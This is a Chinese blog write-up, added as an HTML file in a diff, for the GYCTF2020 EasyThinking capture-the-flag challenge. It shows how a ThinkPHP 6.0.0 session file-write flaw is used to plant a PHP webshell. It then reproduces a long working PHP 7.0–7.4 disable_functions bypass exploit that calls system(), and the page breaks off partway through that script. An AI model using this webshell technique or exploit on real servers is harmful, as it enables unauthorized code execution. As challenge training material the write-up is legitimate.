@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Apple.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Apple.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyusanhua2021.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="thinkphp-v6.0.0框架漏洞+disable_functions绕过 打开题目是一个简易网站，目录扫描发现在 www.zip 有源码泄露，下载下来  可以看出是thinkPHP框架搭建的，打个错误路径就能看到具体版本为6.0.0 谷歌6.0以上的thinkPHP漏洞，可以找到一个thinkPHP6 session 任意文件操作漏洞  2020年1月13号，Thinkphp 6.0.2发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF2020-EasyThinking-writeup">
+<meta property="og:url" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/index.html">
+<meta property="og:site_name" content="雾雨散花">
+<meta property="og:description" content="thinkphp-v6.0.0框架漏洞+disable_functions绕过 打开题目是一个简易网站，目录扫描发现在 www.zip 有源码泄露，下载下来  可以看出是thinkPHP框架搭建的，打个错误路径就能看到具体版本为6.0.0 谷歌6.0以上的thinkPHP漏洞，可以找到一个thinkPHP6 session 任意文件操作漏洞  2020年1月13号，Thinkphp 6.0.2发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/.%5CGYCTF2020-EasyThinking%5Cimage-20220106175537402.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/image-20220106212749705.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/image-20220106213051067.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/image-20220106232020235.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/image-20220106233958835.png">
+<meta property="article:published_time" content="2022-01-06T09:36:30.000Z">
+<meta property="article:modified_time" content="2022-01-07T06:00:20.755Z">
+<meta property="article:author" content="wuyusanhua">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/.%5CGYCTF2020-EasyThinking%5Cimage-20220106175537402.png">
+
+<link rel="canonical" href="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>GYCTF2020-EasyThinking-writeup | 雾雨散花</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="雾雨散花" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雾雨散花</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/sakuya.png">
+      <meta itemprop="name" content="wuyusanhua">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雾雨散花">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GYCTF2020-EasyThinking-writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-06 17:36:30" itemprop="dateCreated datePublished" datetime="2022-01-06T17:36:30+08:00">2022-01-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-07 14:00:20" itemprop="dateModified" datetime="2022-01-07T14:00:20+08:00">2022-01-07</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> thinkphp-v6.0.0框架漏洞+disable_functions绕过</p>
+<p>打开题目是一个简易网站，目录扫描发现在 <code>www.zip</code> 有源码泄露，下载下来</p>
+<p><img src="/2022/01/06/GYCTF2020-EasyThinking/.%5CGYCTF2020-EasyThinking%5Cimage-20220106175537402.png" alt="image-20220106175537402"></p>
+<p>可以看出是thinkPHP框架搭建的，打个错误路径就能看到具体版本为6.0.0</p>
+<p>谷歌6.0以上的thinkPHP漏洞，可以找到一个<a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/">thinkPHP6 session 任意文件操作漏洞</a></p>
+<blockquote>
+<p>2020年1月13号，<a target="_blank" rel="noopener" href="https://www.uedbox.com/post/tag/thinkphp/">Thinkphp</a> 6.0.2发布，在详情页指出修复了一处<code>Session安全隐患</code>。经分析，该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以<a target="_blank" rel="noopener" href="https://www.uedbox.com/post/tag/getshell/">getshell</a>。</p>
+<p>具体受影响版本为ThinkPHP6.0.0-6.0.1。</p>
+</blockquote>
+<p>在源码app\home\controller路径下有Member.php文件，里面有一个关键函数search()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = sizeof(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    array_shift(<span class="variable">$recordArr</span>);</span><br><span class="line">                    session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数会将key作为session中Record的值，这样就可以利用key这个可控的值来上传一句话木马</p>
+<p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106212749705.png" alt="image-20220106212749705"></p>
+<p>上传后用蚁剑连接</p>
+<p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106213051067.png"></p>
+<p>但是题目到这还没有结束，在根目录下找到/flag，进去后却没有flag的信息</p>
+<p>/flag旁边有一个/readflag，大概率就是要通过它来获取flag</p>
+<p>把key的内容换为phpinfo()，访问shell文件查看详细信息</p>
+<p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106232020235.png" alt="image-20220106232020235"></p>
+<p>可以看到很多函数都被过滤掉，可以在<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master">大佬的github</a>找到php7.0~7.4的通杀脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span 